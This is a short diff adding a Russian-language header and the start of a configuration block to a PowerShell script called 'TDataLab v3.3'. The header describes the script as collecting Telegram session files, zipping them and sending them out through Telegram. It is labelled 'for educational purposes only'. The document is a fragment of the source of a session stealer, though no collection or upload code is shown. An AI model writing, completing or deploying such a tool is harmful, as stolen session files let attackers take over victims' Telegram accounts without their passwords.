@@ -1,3 +1,17 @@
+<#
+.SYNOPSIS
+    TDataLab v3.3 — Исправленная стабильная версия
+.DESCRIPTION
+    Собирает доступные файлы сессии Telegram, упаковывает в ZIP и отправляет в Telegram.
+    Работает в PowerShell 5.1 и выше.
+.NOTES
+    Версия: 3.3
+    Только для образовательных целей.
+#>
+
+# ============================================================
+#  НАСТРОЙКИ
+# ============================================================
 $script:Config = @{
     OutputDir     = "$env:USERPROFILE\Desktop"
     ZipName       = "TDATA_Lab_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
